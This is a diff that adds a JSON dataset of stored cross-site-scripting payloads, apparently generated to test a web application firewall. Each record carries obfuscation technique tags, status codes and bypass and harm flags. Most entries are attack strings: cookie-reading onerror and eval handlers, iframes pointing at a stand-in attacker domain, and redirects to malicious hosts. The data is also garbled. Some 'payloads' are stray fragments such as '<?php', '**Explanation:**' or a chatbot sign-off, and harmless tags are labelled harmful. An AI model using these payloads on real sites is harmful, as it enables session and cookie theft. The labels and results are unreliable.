@@ -1,0 +1,402 @@
+[
+    {
+        "payload": "<img src=\"onmouseover=alert('XSS') onclick='document.getElementById(\\'target\\').style.color=\\'\\';'><script>window.onload = function() { document.body.innerHTML += '<iframe style=\"display:none; width:1px; height:0;\"  onerror=\"eval(atob(\"'+ obf_url_encode(&apos;&lt;script&gt;location.href=&quot;javascript%3A%2F%2F&amp;site-name=%27xss%27\")+)')\" target=\"_blank\"></iframe>'; }</script",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<script>alert('XSS')</script><iframe src=\"http://your-attacker-domain/xss-payload?id=123\"></iframe>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAADz1F2T AAAABlBMVEXkDwHhwBAQjBCpOygE%3D8xZvY5K9yQQoB7cRAFAEAIAmJgcXMgDA\" alt=\"\" onerror=\"alert(document.cookie)\"/>",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"javascript:(function() { \tvar x = 'alert(\"XSS!\")'; document.body.innerHTML += '<script>x</scripts>'; })()\">",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<img src=\"x\"onerror=alert(document.cookie)onload=window.location='http://example.com/malicious-site' />",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\"onerror=alert(document.cookie)onload='eval('base64decode('+unescape(escape(\"&#39;\"+window.location.href)+\"'')+')'>",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\"onerror=alert(123) />",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"javascript:(function(){alert('XSS!');})();\">",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "&lt;img src=&#x6C;&#x72;&#x5F;&#x4E;-.;(function(){alert('XSS')})%3B>",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg fill=\"red\" viewBox=\"0 0 100 50\">",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+SVG onEvent_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg>alert(document.cookie)</svg><script>var e=new Date().getDate();</script>window.onload=\"javascript:String.fromCharCode('A'*16);\">",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<div id=\"target\">",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\" />",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<a href=\"http://example.com/page?<?php echo base64_decode(base64_encode('alert()')); ?>\">test</a>",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<script>alert(1)</script><iframe src=\"http://www.<malicious-site>.com/evil?ref=javascript%20code&amp;target=_blank\"></iframe><img onerror='eval(\"'+document.cookie+\"\")' />",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=x onerror=\"eval(document.cookie)\"/>",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg><text x=\"0\" y=\"25\"><tspan style='font-family:\"Comic Sans MS\"; font-size: 18px; color:#FF9F4E;' onclick=\"alert('XSS Payload')\">Your Name</tspan></svg>",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 150 150\"> </svg>",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?phpserve>http://<your-target>/?page=admin&input=<script>alert(\"XSS\");</script>&a%3D1234567890;",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "**Explanation:**",
+        "technique": "SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<img src=\"x\"onerror=eval(\"alert('XSS')\"onload=\"eval(prompt('<iframe width=10 height=2>'))\"/>\">",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "'<svg><font color=\"red\">alert(\"XSS\")</font></svg>'",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg><script>alert('XSS')</script></svg>",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg>v=1><iframe src=\"https://www.example.com%3A80/x?q=%2F\" width=\"54\"> </iframe></svg>",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"javascript:(function(){alert('XSS')})\" onerror= \"console.log(document.cookie)\" >",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\"onerror=alert(1)onload=\"document.body.innerHTML='XSS Payload'\"/>",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/SVG\" width=1 height=1 >",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<!DOCTYPE html>",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "<?php",
+        "technique": "obf_double_url_encode+obf_whitespace_url_full_bypass+obf_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": false
+    },
+    {
+        "payload": "&lt;svg/onload=alert(1) /script>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 0,
+        "is_bypassed": null,
+        "is_harmful": true
+    },
+    {
+        "payload": "<a href=\"javascript:(function(){alert('XSS!');})\" onclick=\"something()\" onmouseover=\"alert('')\">Click me</a>",
+        "technique": "Direct JS Call XSS (manual refine)_non_script_xss+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg><script>alert('XSS')</script></svg>",
+        "technique": "obf_double_url_encode+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\"onerror='alert(document.cookie);'onload='window.location=encodeURI(\"http://example.com/exploit?param=\")'>",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\" onerror=alert(1);>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\" onerror=alert('XSS')>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100%\" height=\"50\">",
+        "technique": "SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\" onerror=alert(1)>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<a href=\"https://example.com/login?username=x&password=<img src='data:image;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAACQAAAAB1V5bSAAEAYlEQVR42mNkYzC3oBAyFAe7F9ZygRCh8HNNBBYAHEqTGBcKAgIAJBBkPQCDBMDDWIBGAFpFFDWWdCBXUBnCVKKCKUJKCIURuCCUUDU",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+Direct JS Call XSS (manual refine)_non_script_xss",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "<img src=\"x\" onerror=alert(1)>",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+obf_whitespace_url+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+Event Handler XSS (heuristic)_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<script>alert(document.cookie);var x=10;eval(\"for (i=0; i < \"+x+\");</script><iframe src=\"http://www.google.com\"></iframe>",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "&lt;script%3C/iframe%3E>alert(1)&#092;&#x26;javascript:(function(){document.getElementById('target').innerHTML='XSSpayload'})(&amp)%3B</body>&gt;",
+        "technique": "obf_url_encode+obf_case_random_full_bypass+obf_double_url_encode+obf_case_random_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<img src=\"x\"onerror=alert(document.cookie)onload=javascript:(function(){window.location.href='your-payload'})(this);>",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\">",
+        "technique": "obf_whitespace_url+obf_case_random_full_bypass+SVG onEvent_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": true
+    },
+    {
+        "payload": "<script>alert('XSS Bypass!');</script><iframe src=\"https://example.com?param=x\" onload='alert(\"Malicious Script\")'></iframe>",
+        "technique": "Event Handler XSS (heuristic)_adv_obf_full_bypass+obf_double_url_encode+obf_whitespace_url_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    },
+    {
+        "payload": "Let me know if you'd like different payloads or want to explore other types of XSS attacks!  Just remember that exploiting vulnerabilities is ethically questionable and can be illegal in some situations, so use this information responsibly. Let your curiosity lead to ethical security practice rather than harmful actions. 😊 👍   Please let",
+        "technique": "IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 200,
+        "is_bypassed": true,
+        "is_harmful": false
+    },
+    {
+        "payload": "<img src=\"https://www.example.com/x?id=malicious&src=<script>alert('XSS')</script>&onerror='onmouseover()' \"  onload=\"body.innerHTML = 'your message here'\" />",
+        "technique": "SVG onEvent_adv_obf_full_bypass+obf_double_url_encode+obf_case_random_full_bypass+IMG onerror+Body onLoad_adv_obf_full_bypass",
+        "attack_type": "xss_stored",
+        "status_code": 403,
+        "is_bypassed": false,
+        "is_harmful": false
+    }
+]
